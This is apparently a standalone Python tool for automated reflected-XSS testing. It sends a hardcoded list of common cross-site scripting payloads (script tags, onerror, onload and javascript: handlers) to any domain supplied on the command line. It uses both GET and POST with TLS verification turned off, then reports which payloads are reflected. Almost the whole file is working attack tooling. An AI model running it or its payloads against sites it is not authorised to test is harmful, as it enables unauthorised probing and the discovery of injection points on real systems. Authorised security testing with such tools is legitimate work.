#!/usr/bin/env python3
import requests
from urllib.parse import urljoin
from prettytable import PrettyTable
from colorama import Fore, Style, init
import argparse

init(autoreset=True)

# ================== PAYLOADS ==================
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]

# ================== TABLE ==================
def table():
    t = PrettyTable([Fore.CYAN+"Payload", Fore.CYAN+"Method", Fore.CYAN+"Reflected"])
    t.align = "l"
    return t

# ================== XSS TEST ==================
def test_xss(domain):
    print(f"\n{Fore.YELLOW}🦅 XSS AUTO PAYLOAD TEST{Style.RESET_ALL}")

    base_url = f"https://{domain}"
    t = table()

    for payload in XSS_PAYLOADS:
        # ---------- GET ----------
        try:
            r = requests.get(base_url, params={"q": payload}, timeout=7, verify=False)
            if payload in r.text:
                t.add_row([
                    Fore.WHITE + payload,
                    Fore.YELLOW + "GET",
                    Fore.GREEN + "REFLECTED"
                ])
            else:
                t.add_row([
                    Fore.WHITE + payload,
                    Fore.YELLOW + "GET",
                    Fore.WHITE + "NO"
                ])
        except:
            pass

        # ---------- POST ----------
        try:
            r = requests.post(base_url, data={"q": payload}, timeout=7, verify=False)
            if payload in r.text:
                t.add_row([
                    Fore.WHITE + payload,
                    Fore.YELLOW + "POST",
                    Fore.GREEN + "REFLECTED"
                ])
            else:
                t.add_row([
                    Fore.WHITE + payload,
                    Fore.YELLOW + "POST",
                    Fore.WHITE + "NO"
                ])
        except:
            pass

    print(t)

# ================== MAIN ==================
def main():
    parser = argparse.ArgumentParser(description="Auto Reflected XSS Tester")
    parser.add_argument("target", help="example.com (no http)")
    args = parser.parse_args()

    domain = args.target.replace("http://","").replace("https://","")
    print(f"{Fore.CYAN}🎯 Target: {domain}")

    test_xss(domain)

if __name__ == "__main__":
    main()
